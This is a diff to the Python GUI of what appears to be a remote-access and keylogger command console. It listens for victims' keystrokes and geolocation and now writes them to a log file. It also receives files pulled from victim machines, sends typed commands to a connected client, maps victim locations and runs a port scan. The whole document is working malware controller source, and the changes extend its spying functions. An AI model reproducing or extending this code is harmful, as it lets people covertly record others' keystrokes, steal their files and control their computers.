@@ -8,6 +8,8 @@ import subprocess
 import time
 import pickle
 import os
+from datetime import datetime
+from tkinter import messagebox
 
 
 class App(customtkinter.CTk):
@@ -30,7 +32,6 @@ class App(customtkinter.CTk):
 
     # Important Strings
     sep = ":***:"
-
     def __init__(self):
         super().__init__()
                
@@ -44,7 +45,7 @@ class App(customtkinter.CTk):
         #                                        UI design                                         #
         ############################################################################################
         
-                #! Backround image (red_forest)
+        #! Backround image (red_forest)
         self.bg_image = customtkinter.CTkImage(light_image=Image.open("Data//red_forest.png"),
                                   dark_image=Image.open("Data//red_forest.png"),
                                   size=(300, 500))
@@ -130,24 +131,28 @@ class App(customtkinter.CTk):
         
         #! Center Frame: Main content/command line
         self.frame2 = customtkinter.CTkFrame(master=self,
-                               width=300,
-                               height=50,
+                               width=500,
+                               height=400,
                                corner_radius=0)
         self.frame2.grid(row=0, column=2, sticky="s")
+        
+        # BIG_Textbox, big_textbox, big
+        self.m_textbox = customtkinter.CTkTextbox(self.frame2, width=565, height=400,corner_radius=0)
+        self.m_textbox.grid(row=1, column=1, sticky="n")
 
         self.entry = customtkinter.CTkEntry(master=self.frame2,
                                placeholder_text=" ",
-                               width=300,
+                               width=320,
                                height=50,
                                border_width=2,
                                corner_radius=10)
-        self.entry.grid(row=2, column=1, sticky="s", pady = 25, padx = 53)
+        self.entry.grid(row=2, column=1, sticky="w", pady = 25, padx = 5)
 
         self.button = customtkinter.CTkButton(master=self.frame2,height=25,
                                               fg_color="#620606",
                                               hover_color="black",  
                                               command=self.send_to_client,text="Submit")
-        self.button.grid(row=2, column=2, padx = 10, pady = 10, )
+        self.button.grid(row=2, column=1, padx = 10, pady = 10, sticky = "e")
                 
         ###########################################################################################
         #                                        System                                           #
@@ -168,6 +173,7 @@ class App(customtkinter.CTk):
                     cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     cli.connect((HOST,PORT))
                     print("CLI_Success: Connected to CLI client.")
+                    self.m_textbox.insert("0.0", f"\nCLI connection succesfull\n")  
                     # Add the cli socket only once to the list
                     if cli not in self.SERVER_SOCKETS:
                         self.SERVER_SOCKETS.append(cli) 
@@ -185,8 +191,11 @@ class App(customtkinter.CTk):
                             cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                             cli.connect((HOST,PORT))
                             print("CLI_Success: Reconnected with the client.")
+                            self.m_textbox.insert("0.0", f"\nClient to server connection re-established.\n") 
                             if cli not in self.SERVER_SOCKETS: self.SERVER_SOCKETS.append(cli) 
-                        except: print(f"CLI Reconnection error: {e}")
+                        except: 
+                            self.m_textbox.insert("0.0", f"\nERROR: Client disconnected!\n") 
+                            print(f"CLI Reconnection error: {e}")
                 time.sleep(3)
         start_CLI_socket()    
 
@@ -198,26 +207,34 @@ class App(customtkinter.CTk):
             t2.start()
 
         def createKeylogSocket():
-            HOST = self.keylog_SOIP  # Standard loopback interface address (localhost)
-            PORT = self.keylog_SOPORT  # Port to listen on (non-privileged ports are > 1023)
-            while True:
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    self.SERVER_SOCKETS.append(s)
-                    # Continue
-                    s.bind((HOST, PORT))
-                    s.listen()
-                    conn, addr = s.accept()
-                    self.CLIENT_IP.append(addr)
-                    with conn:
-                        print(f"KEYLOGGER: Connected by {addr}")
-                        self.USER_GEOLOCATIONS.append(conn.recv(64).decode("utf-8"))
-                        self.textbox.insert("0.0", f"{self.USER_GEOLOCATIONS}\n")
-                        while True:
-                            try: 
-                                data = conn.recv(1024).decode("utf-8") 
-                                self.textbox.insert("0.0", f"{data[1:-1]}\n")
-                            except: print("\nKeylogger connection reset.\n"); break 
-                            time.sleep(0.0001)
+            HOST = self.keylog_SOIP
+            PORT = self.keylog_SOPORT 
+            global k_file
+            with open("Keylogger_data.txt", "a") as k_file: # Create the Keylogger_data.txt file
+                k_file.write(f"\nLOG: {str(datetime.now())}")
+                while True:
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                        self.SERVER_SOCKETS.append(s)
+                        # Continue
+                        s.bind((HOST, PORT))
+                        s.listen()
+                        conn, addr = s.accept()
+                        self.CLIENT_IP.append(addr)
+                        self.m_textbox.insert("0.0", f"\nKeylogger operational.\n")  
+                        with conn:
+                            print(f"KEYLOGGER: Connected by {addr}")
+                            self.USER_GEOLOCATIONS.append(conn.recv(64).decode("utf-8"))
+                            self.textbox.insert("0.0", f"{self.USER_GEOLOCATIONS}\n")
+                            while True:
+                                try: 
+                                    data = conn.recv(1024).decode("utf-8") 
+                                    self.textbox.insert("0.0", f"{data}\n")
+                                    k_file.write(f"{data}\n")
+                                except: 
+                                    print("\nKeylogger connection reset.\n"); 
+                                    k_file.close()
+                                    break 
+                                time.sleep(0.0001)
         startSocket()
         
         #? FILE_TRANSFER SOCKET
@@ -259,14 +276,12 @@ class App(customtkinter.CTk):
             PORT = self.file_transfer_SOPORT
 
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                # BIG_Textbox, big_textbox, big
-                textbox = customtkinter.CTkTextbox(self, width=565, height=400,corner_radius=0)
-                textbox.grid(row=0, column=2, sticky="n")
                 # Create the Socket
                 s.bind((HOST, PORT))
                 s.listen()
                 self.SERVER_SOCKETS.append(s)
-                print("I AM LISTENING")
+                #print("I AM LISTENING")
+                self.m_textbox.insert("0.0", f"\nFile Transfer online.\n")  
                 while True:
                     print("I AM ACCEPTING")
                     conn, addr = s.accept()
@@ -300,7 +315,7 @@ class App(customtkinter.CTk):
                                 case "FILENAME_TEXT":
                                     print(f"\nCreated TXT file: {msg}")
                                     new_file = open(f"Files/{data}", "w")
-                                    textbox.insert("0.0", f"{msg}\n")
+                                    self.m_textbox.insert("0.0", f"{msg}\n")
                                     cmd = ""
 
                                 case "TXT_DATA":
@@ -315,7 +330,7 @@ class App(customtkinter.CTk):
                                             msg = ""
                                             print("Recieved the Trailer.")
                                             new_file.close()     
-                                            textbox.insert("0.0", f"\nFile transfered!\n")   
+                                            self.m_textbox.insert("0.0", f"\nFile transfered!\n")   
                                             break
                                         new_file.write(msg)
                                         filesize = filesize-64
@@ -337,26 +352,32 @@ class App(customtkinter.CTk):
     ############################################################################################
     #                                        Functions                                         #
     ############################################################################################
+
+
     def send_to_client(self):
         global cli
         data = self.entry.get()
         try: cli.send(bytes(f"{data}", "utf-8"))
         except: pass
         print(f"Sent: {data}, to Client")
+        self.m_textbox.insert("0.0", f"\nCLI Packet: {data}\n")  
             
     def showFiles(self):
         subprocess.Popen('explorer "Files"')         
     
-    def killswitch(self): # Shuts down all active sockets and removes them from the list
-        print(self.SERVER_SOCKETS)
-        try:
-            for socket in self.SERVER_SOCKETS:
-                socket.shutdown(socket.SHUT_RDWR)
-                socket.close()
-                self.SERVER_SOCKETS.remove(socket)
-            print("\n!!! KILLSWITCH: Succsesfully shutdown all connections. !!!\n")
-        except:
-            print("\n!!! KILLSWITCH_Error: Socket shutdown. Prob no sockets to close. !!!\n")
+    def killswitch(self):
+        sockets_to_close = list(self.SERVER_SOCKETS) # Make a copy of the list to avoid changing it while iterating over it
+        for i in sockets_to_close:
+            print(type(i))
+        for soc in sockets_to_close:
+            try:
+                soc.shutdown(socket.SHUT_RDWR) # Shutdown both the read and write sides of the socket
+                soc.close()
+                print(f"Closing down socket: {soc}")
+            except OSError:
+                print(f"Error closing socket: {soc}")
+        self.SERVER_SOCKETS.clear() # Remove all sockets from the list
+        print("\n!!! KILLSWITCH: Successfully shutdown all connections. !!!\n")
 
 
     def openScanner(self):
@@ -367,6 +388,7 @@ class App(customtkinter.CTk):
         label = customtkinter.CTkLabel(master=root_tk, text=f"Loading Data.")
         label.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
 
+        self.m_textbox.insert("0.0", "\nPort scanner active!\n")  
         print(str(self.SERVER_SOCKETS))
         portscaner.scan_ports("127.0.0.1", 70)
         
@@ -375,6 +397,7 @@ class App(customtkinter.CTk):
         label1.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
         
         print(portscaner.OPEN_PORTS)
+        self.m_textbox.insert("0.0", "\nPort scanner deactivated.\n")  
 
     def startPortScan(self):
         portThread = threading.Thread(target=self.openScanner)
@@ -391,10 +414,12 @@ class App(customtkinter.CTk):
             # create map widget
             map_widget = tkintermapview.TkinterMapView(root_tk, width=800, height=600, corner_radius=0)
             map_widget.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
+            self.m_textbox.insert("0.0", f"\nGeolocation active.\n")  
             try:
                 map_widget.set_address(f"{self.USER_GEOLOCATIONS}")
             except:
                 map_widget.set_address("colosseo, rome, italy")
+                self.m_textbox.insert("0.0", f"\nGeolocation module lacks coordinates. Default location will be used.\n")  
 
         geoThread = threading.Thread(target=create_geoTopLevel)
         geoThread.daemon = True
@@ -403,7 +428,7 @@ class App(customtkinter.CTk):
     def startGathering(self):
         th = threading.Thread(target=self.Gathering)
         th.daemon=True
-        th.start()
+        th.start() 
 
     def Gathering(self):
         print("Starting1")
@@ -426,7 +451,16 @@ class App(customtkinter.CTk):
                     break
             for info in infos:
                 our_box.insert(customtkinter.END, f"{info}\n")
-    
+
+# Before closing save the keylogger data
+# TODO: Before closing send a server closing message to the client afterwards cleanly kill all active sockets
+def on_closing():
+    if messagebox.askokcancel("Quit", "Do you want to quit?"):
+        k_file.close()
+        app.killswitch()
+        app.destroy()
+
 # Run dze up
 app = App()
+app.protocol("WM_DELETE_WINDOW", on_closing)
 app.mainloop()
